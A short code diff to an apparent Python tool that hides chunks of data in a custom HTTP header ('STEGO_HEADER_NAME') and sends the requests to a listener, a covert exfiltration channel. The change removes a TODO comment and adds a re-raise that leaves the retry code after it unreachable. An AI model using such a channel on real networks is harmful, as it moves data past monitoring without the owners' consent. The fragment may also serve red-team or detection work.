@@ -123,7 +123,7 @@ def create_requests(data: str):
         new_request = deepcopy(default_request)
         new_request.headers[STEGO_HEADER_NAME] = encoded_str_split[i]
         add_request_flags(new_request, request_flags)
-        requests.append(new_request) # TODO FIX: why is each request identical???
+        requests.append(new_request)
     return requests
 
 
@@ -157,6 +157,7 @@ def send_stego_data_to_listener(data: str):
                     response = session.send(request.prepare())
             return response
         except Exception as e:
+            raise e
             print(e)
             sleep(5) # Ensures connection retries aren't sent too frequently
             continue
